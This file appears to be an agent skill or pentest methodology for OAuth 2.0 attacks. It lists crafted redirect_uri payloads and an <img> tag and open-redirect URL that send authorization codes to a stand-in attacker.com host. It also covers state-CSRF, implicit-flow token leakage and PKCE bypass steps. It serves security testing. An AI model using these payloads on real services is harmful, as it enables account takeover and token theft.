---
name: oauth
description: OAuth 2.0 attack methodology. Covers redirect_uri manipulation, state CSRF bypass, authorization code interception, implicit flow token theft, open redirect chaining, and PKCE bypass.
version: 1.0.0
license: Apache-2.0
---

# OAuth 2.0 Attacks

## Phase 1 — Recon

```
Map the OAuth flow: authorization endpoint, token endpoint, redirect URIs, scopes
Check for: state parameter presence, PKCE enforcement, redirect_uri validation strictness
```

## Attack 1 — Redirect URI Manipulation

```
# If server does prefix matching only:
redirect_uri=https://client.com.attacker.com/callback

# If server allows subpaths:
redirect_uri=https://client.com/callback/../attacker-path

# If server allows ports:
redirect_uri=https://client.com:8080/callback

# If regex is used:
redirect_uri=https://attacker.comclient.com/callback
redirect_uri=https://client.com@attacker.com/callback
```

## Attack 2 — State Parameter CSRF

If no `state` parameter (or predictable state):

```
1. Attacker crafts an authorization URL without state
2. Sends it to victim
3. Victim clicks, logs in, gets redirected with `code`
4. Attacker uses the code (via CSRF injection) to bind attacker's account
5. Result: attacker logs in as victim
```

## Attack 3 — Authorization Code Interception

Via Referer header:
```html
<!-- On a page with a third-party resource: -->
<img src="https://attacker.com/steal">
<!-- If victim visits the redirect page, Referer header sends the code to attacker -->
```

Via open redirect:
```
redirect_uri=https://client.com/redirect?url=https://attacker.com
```

## Attack 4 — Implicit Flow Token Theft

```
# In implicit flow, access_token appears in URL fragment (#)
# If the app passes it to a third-party analytics/CDN script:
document.referrer / window.location.hash → token leaked to third party
```

## Attack 5 — PKCE Bypass

If PKCE is implemented but `code_verifier` is not validated server-side:

```
Send authorization request with any code_challenge
Exchange with any code_verifier
→ If server accepts, PKCE is cosmetic
```

## Tools

- Burp Suite — intercept and modify OAuth flows
- [oauth-scan](https://github.com/nicowillis/oauth-scan) — automated OAuth testing

## OWASP Mapping

- A07:2021 — Identification and Authentication Failures
